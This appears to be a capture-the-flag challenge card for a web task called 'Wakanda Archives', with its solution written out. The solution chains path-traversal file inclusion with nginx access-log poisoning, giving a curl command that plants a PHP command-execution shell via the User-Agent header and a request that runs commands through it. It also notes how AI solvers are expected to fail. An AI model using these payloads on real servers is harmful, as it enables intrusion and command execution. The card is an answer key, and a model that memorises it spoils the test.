# Challenge 23

## Title
Wakanda Archives

## Difficulty
Hard | Points: 300

## Description
The Wakanda Digital Archive system exposes a document viewer. It accepts a filename parameter and renders documents. Something about the setup feels vulnerable — but every obvious path is blocked. T'Challa's engineers were careful. But they forgot what the server writes automatically, every single request.

## Service
Live web challenge — URL provided on competition day.

## Hint
*"Wakanda Forever."* — But not forever secure. Every request leaves a trace. Every trace can be weaponised. Check the Server header — know your enemy.

## Solution

**Step 1:** Confirm LFI via `?file=../../../../etc/hostname`

**Step 2:** Check `Server:` response header → `nginx`. The log is NOT at the Apache default path.

**AI trap:** AI tries `/var/log/apache2/access.log` → doesn't exist. Gives up or keeps trying Apache variants. Never checks nginx path.

**Step 3:** Poison the nginx access log by sending PHP in User-Agent:
```bash
curl -H "User-Agent: <?php system(\$_GET['c']); ?>" http://<host>/
```

**Step 4:** Execute via LFI:
```
GET /?file=/var/log/nginx/access.log&c=cat+/flag.txt
```
